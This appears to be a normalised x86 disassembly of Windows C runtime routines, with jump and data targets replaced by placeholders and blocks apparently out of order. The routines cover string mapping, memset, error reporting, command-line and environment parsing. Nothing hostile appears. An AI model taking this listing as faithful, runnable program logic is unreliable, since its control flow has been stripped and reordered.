mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_409890
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409038
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_4098d7
add esp 0x18
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_405a68
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_405a68
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40675e
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
cmp ecx ebx
mov [ ebp - 0x8 ] ecx
je r-xdata
push eax
call sub_405c3e
cmp eax ebx
pop ecx
je r-xdata
call sub_409a90
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_4031e0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_4098d7
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_405c3e
cmp eax ebx
pop ecx
je r-xdata
call sub_409a90
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_40675e
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_40675e
pop ecx
cmp [ ebp + 0x1c ] ebx
push ebx
push ebx
jne r-xdata
push eax
call sub_405c3e
cmp eax ebx
pop ecx
je r-xdata
call sub_409a90
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_406b1b
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_403014
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_406779
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_406b5e
mov eax [ esp + 0x4 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
retn
push 0xd
pop eax
retn
sub_406bac
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_403014
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_406be2
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_403014
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_406bac
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_409446
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_406ca2
push [ rw-data ]
call sub_404e05
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
xor eax eax
inc eax
retn
sub_406cc4
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
test eax eax
pop edi
mov [ ebp - 0x4 ] eax
pop esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_406d0e
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_406d65
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_406d65
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_406d0e
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_406dfe
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
push esi
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_4031e0
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
add esp 0xc
mov [ ebp - 0x80 ] 0xc000000d
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov esi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc000000d
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x2a4 ]
xor ecx ebp
pop esi
call sub_409038
add ebp 0x2a8
leave
retn
test esi esi
jne r-xdata
push 0x2
call sub_409abc
pop ecx
sub_406efa
push ebp
mov ebp esp
push [ rw-data ]
call sub_404e05
test eax eax
pop ecx
je r-xdata
push 0x2
call sub_409abc
pop ecx
pop ebp
jmp sub_406dfe
pop ebp
jmp eax
sub_406f1e
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_405af6
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_406f69
push ecx
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
xor esi esi
xor edi edi
cmp edi 0x17
jae r-xdata
inc edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push ebp
push 0x3
call sub_409c81
cmp eax 0x1
pop ecx
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebp eax
cmp ebp esi
je r-xdata
push 0x3
call sub_409c81
test eax eax
pop ecx
jne r-xdata
pop ebp
cmp ebp 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_405d10
pop ecx
push eax
push [ esi ]
push ebp
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov ebp rw-data
push ebp
call sub_405b8a
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
push esi
call sub_405d10
inc eax
cmp eax 0x3c
pop ecx
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_405b8a
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_405d10
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_409796
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_406dfe
add esp 0x14
push [ edi * 8 + rw-data ]
push ebx
push ebp
call sub_4096df
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push ebp
call sub_409ac4
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
push r--data
push ebx
push ebp
call sub_4096df
add esp 0xc
test eax eax
je r-xdata
sub_407109
push 0x3
call sub_409c81
cmp eax 0x1
pop ecx
je r-xdata
push 0xfc
call sub_406f69
push 0xff
call sub_406f69
pop ecx
pop ecx
push 0x3
call sub_409c81
test eax eax
pop ecx
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_407142
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_404faa
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
cmp eax 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_4072a0
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_40643a
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_409d18
test eax eax
pop ecx
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_4072fd
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
cmp esi ebx
jne r-xdata
call sub_40643a
mov al [ esi ]
cmp al bl
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40531e
mov edi eax
cmp edi ebx
pop ecx
pop ecx
mov [ rw-data ] edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_405d10
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebp
jmp r-xdata
cmp [ esi ] bl
jne r-xdata
push esi
call sub_405d10
mov ebp eax
inc ebp
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_405a68
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
add esi ebp
push 0x1
push ebp
call sub_40531e
cmp eax ebx
pop ecx
pop ecx
mov [ edi ] eax
je r-xdata
push [ rw-data ]
call sub_405a68
mov [ rw-data ] ebx
or eax 0xffffffff
jmp r-xdata
push esi
push ebp
push eax
call sub_405b8a
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebp
add edi 0x4
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_406dfe
add esp 0x14
sub_4073d8
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
cmp [ ebp + 0x8 ] eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_409d18
test eax eax
pop ecx
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl bl
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
test eax eax
pop esi
pop ebx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
test edx edx
movsx eax al
push eax
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_409d18
test eax eax
pop ecx
je r-xdata
call sub_409d18
test eax eax
pop ecx
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_407570
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] esi
je r-xdata
call sub_40643a
mov [ ebp - 0x4 ] esi
cmp [ eax ] bl
mov [ ebp - 0x4 ] eax
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_4073d8
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_4052de
mov esi eax
cmp esi ebx
pop ecx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_4073d8
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_407629
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
xor esi esi
cmp eax ebx
push 0x2
pop ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebp
je r-xdata
cmp esi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call edi
mov esi eax
cmp esi ebx
jne r-xdata
mov eax [ rw-data ]
mov eax ebp
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov edi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax esi
push ebx
sar eax 0x1
inc eax
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub eax esi
inc eax
mov ebp eax
push ebp
call sub_4052de
mov edi eax
cmp edi ebx
pop ecx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_4052de
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
push ebp
push esi
push edi
call sub_402b50
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_405a68
pop ecx
mov [ esp + 0x10 ] ebx
sub_40775e
push 0x54
push r--data
call sub_405770
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_40531e
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
